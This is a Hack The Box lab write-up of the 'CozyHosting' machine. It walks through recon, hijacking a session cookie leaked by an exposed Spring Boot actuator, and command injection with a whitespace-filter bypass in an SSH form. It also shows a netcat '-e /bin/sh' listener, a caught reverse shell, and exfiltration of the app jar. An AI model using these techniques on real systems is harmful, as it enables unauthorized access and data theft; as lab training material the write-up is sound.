---
{"dg-publish":true,"permalink":"/ct-fs/htb/cozyhosting/","dgShowFileTree":true,"dg-note-properties":{}}
---

# By 0xCapra_Daemon aka Will Keller

## Recon
![Pasted image 20260801113521.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260801113521.png)

### Threader3k & Nmap:
```zsh
Enter your target IP address or URL here: 10.129.229.88
------------------------------------------------------------
Scanning target 10.129.229.88
Time started: 2026-08-01 14:36:20.609536
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port scan completed in 0:00:33.158186
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.129.229.88 10.129.229.88
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.129.229.88 10.129.229.88
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-01 14:38 -0400
Nmap scan report for 10.129.229.88
Host is up (0.084s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.52 seconds
```
Initial portscanning reveals open ports on 22 and 80 (ssh and webserver). Updating `/etc/hosts`.

### Port 80
```html
curl -v http://cozyhosting.htb
* Host cozyhosting.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.229.88
*   Trying 10.129.229.88:80...
* Established connection to cozyhosting.htb (10.129.229.88 port 80) from 10.10.14.192 port 33420 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: cozyhosting.htb
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 01 Aug 2026 18:41:47 GMT
< Content-Type: text/html;charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 0
< Cache-Control: no-cache, no-store, max-age=0, must-revalidate
< Pragma: no-cache
< Expires: 0
< X-Frame-Options: DENY
< Content-Language: en-US
< 
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <title>Cozy Hosting - Home</title>

    <link href="assets/img/favicon.png" rel="icon">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Nunito:300,300i,400,400i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
          rel="stylesheet">
    <link href="assets/vendor/aos/aos.css" rel="stylesheet">
    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">

    <!-- =======================================================
    * Template Name: FlexStart
    * Updated: Mar 10 2023 with Bootstrap v5.2.3
    * Template URL: https://bootstrapmade.com/flexstart-bootstrap-startup-template/
    * Author: BootstrapMade.com
    * License: https://bootstrapmade.com/license/
    ======================================================== -->
</head>

<body>

<header id="header" class="header fixed-top">
    <div class="container-fluid container-xl d-flex align-items-center justify-content-between">

        <a href="index.html" class="logo d-flex align-items-center">
            <img src="assets/img/logo.png" alt="">
            <span>Cozy Hosting</span>
        </a>

        <nav id="navbar" class="navbar">
            <ul>
                <li><a class="nav-link scrollto active" href="#hero">Home</a></li>
                <li><a class="nav-link scrollto" href="#values">Services</a></li>
                <li><a class="nav-link scrollto" href="#pricing">Pricing</a></li>
                <li><a class="getstarted scrollto" href="/login">Login</a></li>
            </ul>
            <i class="bi bi-list mobile-nav-toggle"></i>
        </nav>

    </div>
</header>


<section id="hero" class="hero d-flex align-items-center">

    <div class="container">
        <div class="row">
            <div class="col-lg-6 d-flex flex-column justify-content-center">
                <h1 data-aos="fade-up">We offer modern solutions for growing your business</h1>
                <h2 data-aos="fade-up" data-aos-delay="400">Host a project of any size and complexity with Cozy
                    Hosting</h2>
                <div data-aos="fade-up" data-aos-delay="600">
                    <div class="text-center text-lg-start">
                        <a href="#pricing"
                           class="btn-get-started scrollto d-inline-flex align-items-center justify-content-center align-self-center">
                            <span>Get Started</span>
                            <i class="bi bi-arrow-right"></i>
                        </a>
                    </div>
                </div>
            </div>
            <div class="col-lg-6 hero-img" data-aos="zoom-out" data-aos-delay="200">
                <img src="assets/img/hero-img.png" class="img-fluid" alt="">
            </div>
        </div>
    </div>

</section>

<main id="main">

    <section id="values" class="values">

        <div class="container" data-aos="fade-up">

            <header class="section-header">
                <h2>Services</h2>
                <p>What do you get out of the box</p>
            </header>

            <div class="row">

                <div class="col-lg-4" data-aos="fade-up" data-aos-delay="200">
                    <div class="box">
                        <img src="assets/img/values-1.png" class="img-fluid" alt="">
                        <h3>All admin tools you'll ever need</h3>
                        <p>Rich administrative dashboard to take care of host management, including monitoring, host
                            patching and many more.</p>
                    </div>
                </div>

                <div class="col-lg-4 mt-4 mt-lg-0" data-aos="fade-up" data-aos-delay="400">
                    <div class="box">
                        <img src="assets/img/values-2.png" class="img-fluid" alt="">
                        <h3>Easy scaling</h3>
                        <p>Scale easily as your business grows, leave auditing and vulnerability patching on us no matter how big is your fleet.</p>
                    </div>
                </div>

                <div class="col-lg-4 mt-4 mt-lg-0" data-aos="fade-up" data-aos-delay="600">
                    <div class="box">
                        <img src="assets/img/values-3.png" class="img-fluid" alt="">
                        <h3>Reporting tools</h3>
                        <p>Gathering insight was never easier. Compile user and compliance reports in just a few clicks.
                            With Business or Ultimate plan you'll get a big-ass pencil and a stopwatch as a gift.</p>
                    </div>
                </div>

            </div>

        </div>

    </section>

    <section id="pricing" class="pricing">

        <div class="container" data-aos="fade-up">

            <header class="section-header">
                <h2>Pricing</h2>
                <p>Check our Pricing</p>
            </header>

            <div class="row gy-4" data-aos="fade-left">

                <div class="col-lg-3 col-md-6" data-aos="zoom-in" data-aos-delay="100">
                    <div class="box">
                        <h3 style="color: #07d5c0;">Free Plan</h3>
                        <div class="price"><sup>$</sup>0<span> / mo</span></div>
                        <img src="assets/img/pricing-free.png" class="img-fluid" alt="">
                        <ul>
                            <li>One free host for a month</li>
                            <li>Monitoring dashboard</li>
                            <li>Access to admin interface</li>
                            <li class="na">Automated host auditor</li>
                            <li class="na">Automatic host patching</li>
                        </ul>
                        <a href="#" class="btn-buy">Buy Now</a>
                    </div>
                </div>

                <div class="col-lg-3 col-md-6" data-aos="zoom-in" data-aos-delay="200">
                    <div class="box">
                        <span class="featured">Featured</span>
                        <h3 style="color: #65c600;">Starter Plan</h3>
                        <div class="price"><sup>$</sup>19<span> / mo</span></div>
                        <img src="assets/img/pricing-starter.png" class="img-fluid" alt="">
                        <ul>
                            <li>Up to 4 hosts</li>
                            <li>Monitoring dashboard</li>
                            <li>Full admin interface</li>
                            <li>Automated host auditor</li>
                            <li class="na">Automatic host patching</li>
                        </ul>
                        <a href="#" class="btn-buy">Buy Now</a>
                    </div>
                </div>

                <div class="col-lg-3 col-md-6" data-aos="zoom-in" data-aos-delay="300">
                    <div class="box">
                        <h3 style="color: #ff901c;">Business Plan</h3>
                        <div class="price"><sup>$</sup>29<span> / mo</span></div>
                        <img src="assets/img/pricing-business.png" class="img-fluid" alt="">
                        <ul>
                            <li>Up to 20 hosts</li>
                            <li>Monitoring dashboard</li>
                            <li>Full admin interface</li>
                            <li>Automated host auditor</li>
                            <li>Automatic host patching</li>
                        </ul>
                        <a href="#" class="btn-buy">Buy Now</a>
                    </div>
                </div>

                <div class="col-lg-3 col-md-6" data-aos="zoom-in" data-aos-delay="400">
                    <div class="box">
                        <h3 style="color: #ff0071;">Ultimate Plan</h3>
                        <div class="price"><sup>$</sup>49<span> / mo</span></div>
                        <img src="assets/img/pricing-ultimate.png" class="img-fluid" alt="">
                        <ul>
                            <li>Up to 20 hosts</li>
                            <li>Monitoring dashboard</li>
                            <li>Full admin interface</li>
                            <li>Automated host auditor</li>
                            <li>Automatic host patching</li>
                        </ul>
                        <a href="#" class="btn-buy">Buy Now</a>
                    </div>
                </div>

            </div>

        </div>

    </section>

</main>


<footer id="footer" class="footer">

    <div class="footer-top">
        <div class="container">
            <div class="row gy-4">
                <div class="col-lg-5 col-md-12 footer-info">
                    <a href="index.html" class="logo d-flex align-items-center">
                        <img src="assets/img/logo.png" alt="">
                        <span>Cozy Hosting</span>
                    </a>
                    <p>The right place to host a project of any complexity. Choose a plan,
                    deploy your application and relax. Because we are going to take care of the rest.</p>
                    <div class="social-links mt-3">
                        <a href="#" class="twitter"><i class="bi bi-twitter"></i></a>
                        <a href="#" class="facebook"><i class="bi bi-facebook"></i></a>
                        <a href="#" class="instagram"><i class="bi bi-instagram"></i></a>
                        <a href="#" class="linkedin"><i class="bi bi-linkedin"></i></a>
                    </div>
                </div>

                <div class="col-lg-2 col-6 footer-links">
                    <h4>Useful Links</h4>
                    <ul>
                        <li><i class="bi bi-chevron-right"></i> <a href="#">Home</a></li>
                        <li><i class="bi bi-chevron-right"></i> <a href="#">About us</a></li>
                        <li><i class="bi bi-chevron-right"></i> <a href="#">Services</a></li>
                        <li><i class="bi bi-chevron-right"></i> <a href="#">Terms of service</a></li>
                        <li><i class="bi bi-chevron-right"></i> <a href="#">Privacy policy</a></li>
                    </ul>
                </div>

                <div class="col-lg-2 col-6 footer-links">
                    <h4>Our Services</h4>
                    <ul>
                        <li><i class="bi bi-chevron-right"></i> <a href="#">Hosting</a></li>
                        <li><i class="bi bi-chevron-right"></i> <a href="#">Automated patching</a></li>
                        <li><i class="bi bi-chevron-right"></i> <a href="#">SSL management</a></li>
                        <li><i class="bi bi-chevron-right"></i> <a href="#">Mail services</a></li>
                        <li><i class="bi bi-chevron-right"></i> <a href="#">DDoS protection</a></li>
                    </ul>
                </div>

                <div class="col-lg-3 col-md-12 footer-contact text-center text-md-start">
                    <h4>Contact Us</h4>
                    <p>
                        South Jakarta City 12120,
                        Jakarta, Indonesia <br><br>
                        <strong>Phone:</strong> +62 5589 55488 55<br>
                        <strong>Email:</strong> info@cozyhosting.htb<br>
                    </p>

                </div>

            </div>
        </div>
    </div>

    <div class="container">
        <div class="copyright">
            &copy; Copyright <strong><span>Cozy Hosting</span></strong>. All Rights Reserved
        </div>
        <div class="credits">
            Designed by <a href="https://bootstrapmade.com/">BootstrapMade</a>
        </div>
    </div>
</footer>

<a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
        class="bi bi-arrow-up-short"></i></a>

<script src="assets/vendor/aos/aos.js"></script>
<script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
<script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
<script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
<script src="assets/js/main.js"></script>

</body>

* Connection #0 to host cozyhosting.htb:80 left intact
</html>
```
Manual `cURL` to the webserver reveals a webhosting company landing page. Backend server seems to be running `Nginx/1.18.0`

![Pasted image 20260801114425.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260801114425.png)
Visiting in the browser confirms our `cURL` result.

![Pasted image 20260801115435.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260801115435.png)
There's also a `/login` portal.

#### Gobuster

```zsh
└─$ gobuster dir -u http://cozyhosting.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,jss,cs,json,png,jpg,pdf,zip -t 20 --exclude-length 0 | tee ./gobuster_80
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              jpg,php,jss,png,pdf,zip,html,txt,cs,json
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index                (Status: 200) [Size: 12706]
login                (Status: 200) [Size: 4431]
admin                (Status: 401) [Size: 97]
error                (Status: 500) [Size: 73]
```
Subdirectory bruteforce reveals our login portal, a `/admin` endpoint that redirects to `/login` in the browser, and `/error` which ironically throws a server error.

```zsh
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -v -u http://FUZZ.cozyhosting.htb -o vhost.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.cozyhosting.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Output file      : vhost.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
 
```
Vhost bruteforce returns 301 for every request redirecting back to the main host at `http://cozyhosting.htb`.

#### SQLMap

![Pasted image 20260801123057.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260801123057.png)
First we capture a sample login POST request in `caido` and save it to `login_req.txt` to ensure we have the proper headings for `sqlmap`, but it was bubkis.

#### Gobuster revisited (spring-boot context)
I decided to seek out a hint and htb suggests there's an exposed `springboot` endpoint on the machine. So I added [spring-boot.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt) into my own `seclists` and began `dirbuster` again.

```zsh
gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/spring-boot.txt -x html,php,txt,json,cs,js,png,jpg,pdf,zip,back,tar,tar.gz -t 20 | tee ./gobuster_spring_boot    
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/spring-boot.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,txt,cs,js,png,pdf,back,tar,php,json,jpg,zip,tar.gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
actuator             (Status: 200) [Size: 634]
actuator/beans       (Status: 200) [Size: 127224]
actuator/env         (Status: 200) [Size: 4957]
actuator/env/home    (Status: 200) [Size: 487]
actuator/env/lang    (Status: 200) [Size: 487]
actuator/env/path    (Status: 200) [Size: 487]
actuator/health      (Status: 200) [Size: 15]
actuator/mappings    (Status: 200) [Size: 9938]
actuator/sessions    (Status: 200) [Size: 48]
admin                (Status: 401) [Size: 97]
===============================================================
Finished
===============================================================
```
looks like `/actuator/` subdir is exposed to the net. Seems to have a lot of interesting endpoints as well i.e. `/env/*`, `/sessions`,`/mappings`,`/beans`, etc.

![Pasted image 20260801144349.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260801144349.png)
Visiting `/actuator` in the browser lists all of it's subdirectories as well as the local port that this springboot server is operating on server-side.

![Pasted image 20260803103028.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260803103028.png)
Visiting `/actuator/sessions` reveals user `kanderson` with what appears to be their Session Cookie. We may be able to steal this and inject it to gain a session on the admin side of the app.

![Pasted image 20260803103600.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260803103600.png)
`/actuator/env`: seems heavily redacted in an unauthed session, but may prove useful if we can compromise `kanderson`.

![Pasted image 20260803103957.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260803103957.png)
Visiting `/actuator/mappings` reveals different api routes for this app. One interesting one seems to be a web-to-ssh command interface accessed by sending a POST req to `/executessh`

![Pasted image 20260803104209.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260803104209.png)
Successfully got session on app at `/admin` as user `kanderson` by injecting the session cookie directly into our session.

![Pasted image 20260803104329.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260803104329.png)
At the bottom of `/admin` we see a section to `Add host to automated scanning` where we can specify a host and username. The note also mentions, somewhat mistakenly, that the host we are trying to reach in this app should have our private key in the host's authorized_keys file. However traditionally you'd want you **public** key in there instead.

![Pasted image 20260803104830.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260803104830.png)
As you can see, this app section is what's using `/executessh`. When we tried to add both `localhost` and `127.0.0.1` under user `kanderson` we get an error. Let's see if we can setup `TCPdump` to listen for an incoming connection request.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cozyhosting/scanning]
└─$ gobuster dir -u http://cozyhosting.htb/actuator -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/spring-boot.txt -x html,php,txt,json,cs,js,png,jpg,pdf,zip,back,tar,tar.gz -t 20 -c 'JESSIONID=78AF1C10597B78B08DF1978FA3CE1A3E'| tee ./gobuster_auth_actuator
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb/actuator
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/spring-boot.txt
[+] Negative Status codes:   404
[+] Cookies:                 JESSIONID=78AF1C10597B78B08DF1978FA3CE1A3E
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php,json,cs,pdf,back,txt,js,png,jpg,zip,tar,tar.gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
beans                (Status: 200) [Size: 127224]
env                  (Status: 200) [Size: 4957]
env/home             (Status: 200) [Size: 487]
env/lang             (Status: 200) [Size: 487]
env/path             (Status: 200) [Size: 487]
health               (Status: 200) [Size: 15]
mappings             (Status: 200) [Size: 9938]
sessions             (Status: 200) [Size: 95]
===============================================================
Finished
===============================================================

```
`gobuster` was able to bruteforce three endpoints for `/actuator/env/` with our authed user's session. However they all give 404s so we may need to enumerate them further as they could just be subdirectories...Those led to dead ends.

![Pasted image 20260803111053.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260803111053.png)
Capturing our POST req from the scanner section of `/admin` we see that we get a 302 with X-Frame-Options: DENY returned. This could be a valid testing flow for fuzzing valid users because the specific error we get is "host key verification failed" instead of "port unreachable" (like when we tried to hit our own machine with a listener). This suggests there's a valid hostname record for `localhost` on this app.

![Pasted image 20260803112947.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260803112947.png)
Manual testing of the request also seems to throw a different error when we try to use `;id` after our username entry. We can see that the server is wrapping our request in `@hostname` with whatever hostname we provided. 

![Pasted image 20260803113402.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260803113402.png)
As we can see, adding a command after the semicolon and also adding a closing quote `"` via url encoding makes the error even more verbose. it looks like this app is making a `bash -c` command on the server. Let's see if we can break out of the command structure to give us RCE.

![Pasted image 20260803115412.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260803115412.png)
After more mangling we finally get execution on this machine (blind/out-of-band) by using the braces notation for shell commands since the app filters whitespaces from our input.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cozyhosting/files]
└─$ nc -lnvp 9999 -e /bin/sh
listening on [any] 9999 ...
connect to [10.10.14.192] from (UNKNOWN) [10.129.229.88] 59906
id


whoami
/bin/bash

```
Successfully caught a connection but shell couldn't be established. Let's try a bash reverse shell instead.

![Pasted image 20260803123215.png](/img/user/CTFs/HTB/Images/Cozyhosting%20Images/Pasted%20image%2020260803123215.png)
After some more mangling and research we found a proper payload for our reverse shell. We use `-t` before the first semicolon to tell ssh to force psuedo-terminal allocation making this session able to spawn an interactive TTY, and we use the command replacement technique to pass the `$IFS` variable which is the `Internal File Separator` in Unix systems which allows us to bypass the no spaces filter. Finally we set all of the ampersand `&` characters to their URL encoded `%26` because the front end kept trying to interpret them instead of pass them to the server.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cozyhosting/files]
└─$ nc -lnvp 8888             
listening on [any] 8888 ...
connect to [10.10.14.192] from (UNKNOWN) [10.129.229.88] 33780
bash: cannot set terminal process group (981): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ 
```
Reverse shell successful on target machine.

```zsh
app@cozyhosting:/home$ find / -user app 2>/dev/null
/tmp/hsperfdata_app
/tmp/hsperfdata_app/981
/tmp/tomcat-docbase.8080.12895063230238917903
/tmp/tomcat.8080.1494473595043015379
/tmp/tomcat.8080.1494473595043015379/work
/tmp/tomcat.8080.1494473595043015379/work/Tomcat
/tmp/tomcat.8080.1494473595043015379/work/Tomcat/localhost
/tmp/tomcat.8080.1494473595043015379/work/Tomcat/localhost/ROOT

```
Light manual enumeration shows we have some interesting `tomcat` files.

```zsh
app@cozyhosting:/app$ ls
total 58M
4.0K drwxr-xr-x  2 root root 4.0K Aug 14  2023 .
4.0K drwxr-xr-x 19 root root 4.0K Aug 14  2023 ..
 58M -rw-r--r--  1 root root  58M Aug 11  2023 cloudhosting-0.0.1.jar
app@cozyhosting:/app$ python3 -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
10.10.14.192 - - [03/Aug/2026 19:42:03] "GET /cloudhosting-0.0.1.jar HTTP/1.1" 200 -

```
Further enumeration of our pwd shows a .jar file seemingly for the app.

```zsh
unzip cloudhosting-0.0.1.jar 
Archive:  cloudhosting-0.0.1.jar
   creating: META-INF/
  inflating: META-INF/MANIFEST.MF    
   creating: org/
   creating: org/springframework/
   creating: org/springframework/boot/
   creating: org/springframework/boot/loader/
  inflating: org/springframework/boot/loader/ClassPathIndexFile.class  
  inflating: org/springframework/boot/loader/ExecutableArchiveLauncher.class  
  inflating: org/springframework/boot/loader/JarLauncher.class  
  inflating: org/springframework/boot/loader/LaunchedURLClassLoader$DefinePackageCallType.class  
  inflating: org/springframework/boot/loader/LaunchedURLClassLoader$UseFastConnectionExceptionsEnumeration.class  
  inflating: org/springframework/boot/loader/LaunchedURLClassLoader.class  
  inflating: org/springframework/boot/loader/Launcher.class  
  inflating: org/springframework/boot/loader/MainMethodRunner.class  
  inflating: org/springframework/boot/loader/PropertiesLauncher$ArchiveEntryFilter.class  
  inflating: org/springframework/boot/loader/PropertiesLauncher$ClassPathArchives.class  
  inflating: org/springframework/boot/loader/PropertiesLauncher$PrefixMatchingArchiveFilter.class  
  inflating: org/springframework/boot/loader/PropertiesLauncher.class  
  inflating: org/springframework/boot/loader/WarLauncher.class  
   creating: org/springframework/boot/loader/archive/
  inflating: org/springframework/boot/loader/archive/Archive$Entry.class  
  inflating: org/springframework/boot/loader/archive/Archive$EntryFilter.class  
  inflating: org/springframework/boot/loader/archive/Archive.class  
  inflating: org/springframework/boot/loader/archive/ExplodedArchive$AbstractIterator.class  
  inflating: org/springframework/boot/loader/archive/ExplodedArchive$ArchiveIterator.class  
  inflating: org/springframework/boot/loader/archive/ExplodedArchive$EntryIterator.class  
  inflating: org/springframework/boot/loader/archive/ExplodedArchive$FileEntry.class  
  inflating: org/springframework/boot/loader/archive/ExplodedArchive$SimpleJarFileArchive.class  
  inflating: org/springframework/boot/loader/archive/ExplodedArchive.class  
  inflating: org/springframework/boot/loader/archive/JarFileArchive$AbstractIterator.class  
  inflating: org/springframework/boot/loader/archive/JarFileArchive$EntryIterator.class  
  inflating: org/springframework/boot/loader/archive/JarFileArchive$JarFileEntry.class  
  inflating: org/springframework/boot/loader/archive/JarFileArchive$NestedArchiveIterator.class  
  inflating: org/springframework/boot/loader/archive/JarFileArchive.class  
   creating: org/springframework/boot/loader/data/
  inflating: org/springframework/boot/loader/data/RandomAccessData.class  
  inflating: org/springframework/boot/loader/data/RandomAccessDataFile$DataInputStream.class  
  inflating: org/springframework/boot/loader/data/RandomAccessDataFile$FileAccess.class  
  inflating: org/springframework/boot/loader/data/RandomAccessDataFile.class  
   creating: org/springframework/boot/loader/jar/
  inflating: org/springframework/boot/loader/jar/AbstractJarFile$JarFileType.class  
  inflating: org/springframework/boot/loader/jar/AbstractJarFile.class  
  inflating: org/springframework/boot/loader/jar/AsciiBytes.class  
  inflating: org/springframework/boot/loader/jar/Bytes.class  
  inflating: org/springframework/boot/loader/jar/CentralDirectoryEndRecord$Zip64End.class  
  inflating: org/springframework/boot/loader/jar/CentralDirectoryEndRecord$Zip64Locator.class  
  inflating: org/springframework/boot/loader/jar/CentralDirectoryEndRecord.class  
  inflating: org/springframework/boot/loader/jar/CentralDirectoryFileHeader.class  
  inflating: org/springframework/boot/loader/jar/CentralDirectoryParser.class  
  inflating: org/springframework/boot/loader/jar/CentralDirectoryVisitor.class  
  inflating: org/springframework/boot/loader/jar/FileHeader.class  
  inflating: org/springframework/boot/loader/jar/Handler.class  
  inflating: org/springframework/boot/loader/jar/JarEntry.class  
  inflating: org/springframework/boot/loader/jar/JarEntryCertification.class  
  inflating: org/springframework/boot/loader/jar/JarEntryFilter.class  
  inflating: org/springframework/boot/loader/jar/JarFile$1.class  
  inflating: org/springframework/boot/loader/jar/JarFile$JarEntryEnumeration.class  
  inflating: org/springframework/boot/loader/jar/JarFile.class  
  inflating: org/springframework/boot/loader/jar/JarFileEntries$1.class  
  inflating: org/springframework/boot/loader/jar/JarFileEntries$EntryIterator.class  
  inflating: org/springframework/boot/loader/jar/JarFileEntries$Offsets.class  
  inflating: org/springframework/boot/loader/jar/JarFileEntries$Zip64Offsets.class  
  inflating: org/springframework/boot/loader/jar/JarFileEntries$ZipOffsets.class  
  inflating: org/springframework/boot/loader/jar/JarFileEntries.class  
  inflating: org/springframework/boot/loader/jar/JarFileWrapper.class  
  inflating: org/springframework/boot/loader/jar/JarURLConnection$1.class  
  inflating: org/springframework/boot/loader/jar/JarURLConnection$JarEntryName.class  
  inflating: org/springframework/boot/loader/jar/JarURLConnection.class  
  inflating: org/springframework/boot/loader/jar/StringSequence.class  
  inflating: org/springframework/boot/loader/jar/ZipInflaterInputStream.class  
   creating: org/springframework/boot/loader/jarmode/
  inflating: org/springframework/boot/loader/jarmode/JarMode.class  
  inflating: org/springframework/boot/loader/jarmode/JarModeLauncher.class  
  inflating: org/springframework/boot/loader/jarmode/TestJarMode.class  
   creating: org/springframework/boot/loader/util/
  inflating: org/springframework/boot/loader/util/SystemPropertyUtils.class  
   creating: BOOT-INF/
   creating: BOOT-INF/classes/
   creating: BOOT-INF/classes/htb/
   creating: BOOT-INF/classes/htb/cloudhosting/
   creating: BOOT-INF/classes/htb/cloudhosting/database/
   creating: BOOT-INF/classes/htb/cloudhosting/secutiry/
   creating: BOOT-INF/classes/htb/cloudhosting/compliance/
   creating: BOOT-INF/classes/htb/cloudhosting/scheduled/
   creating: BOOT-INF/classes/htb/cloudhosting/exception/
   creating: BOOT-INF/classes/static/
   creating: BOOT-INF/classes/static/assets/
   creating: BOOT-INF/classes/static/assets/css/
   creating: BOOT-INF/classes/static/assets/js/
   creating: BOOT-INF/classes/static/assets/img/
   creating: BOOT-INF/classes/static/assets/vendor/
   creating: BOOT-INF/classes/static/assets/vendor/swiper/
   creating: BOOT-INF/classes/static/assets/vendor/isotope-layout/
   creating: BOOT-INF/classes/static/assets/vendor/bootstrap/
   creating: BOOT-INF/classes/static/assets/vendor/bootstrap/css/
   creating: BOOT-INF/classes/static/assets/vendor/bootstrap/js/
   creating: BOOT-INF/classes/static/assets/vendor/glightbox/
   creating: BOOT-INF/classes/static/assets/vendor/glightbox/css/
   creating: BOOT-INF/classes/static/assets/vendor/glightbox/js/
   creating: BOOT-INF/classes/static/assets/vendor/bootstrap-icons/
   creating: BOOT-INF/classes/static/assets/vendor/bootstrap-icons/fonts/
   creating: BOOT-INF/classes/static/assets/vendor/remixicon/
   creating: BOOT-INF/classes/static/assets/vendor/php-email-form/
   creating: BOOT-INF/classes/static/assets/vendor/purecounter/
   creating: BOOT-INF/classes/static/assets/vendor/echarts/
   creating: BOOT-INF/classes/static/assets/vendor/echarts/extension/
   creating: BOOT-INF/classes/static/assets/vendor/aos/
   creating: BOOT-INF/classes/templates/
   creating: META-INF/maven/
   creating: META-INF/maven/htb.cloudhosting/
   creating: META-INF/maven/htb.cloudhosting/cloudhosting/
  inflating: BOOT-INF/classes/htb/cloudhosting/database/UserRepository.class  
  inflating: BOOT-INF/classes/htb/cloudhosting/database/CozyUserDetailsService.class  
  inflating: BOOT-INF/classes/htb/cloudhosting/database/CozyUser.class  
  inflating: BOOT-INF/classes/htb/cloudhosting/MvcConfig.class  
  inflating: BOOT-INF/classes/htb/cloudhosting/CozyHostingApp.class  
